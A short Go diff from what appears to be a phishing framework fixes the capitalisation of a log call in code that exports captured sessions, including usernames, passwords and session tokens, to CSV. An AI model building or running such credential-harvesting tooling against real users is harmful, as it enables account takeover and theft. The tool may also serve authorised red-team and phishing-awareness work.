@@ -380,7 +380,7 @@ func (t *Terminal) handleSessions(args []string) error {
 					wr.Write([]string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, base64tokens, s.RemoteAddr, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")})
 				}
 				wr.Flush()
-				log.info("exported sessions to csv: %s", outFile.Name())
+				log.Info("exported sessions to csv: %s", outFile.Name())
 			case "json":
 				type ExportedSession struct {
 					Id string `json:"id"`
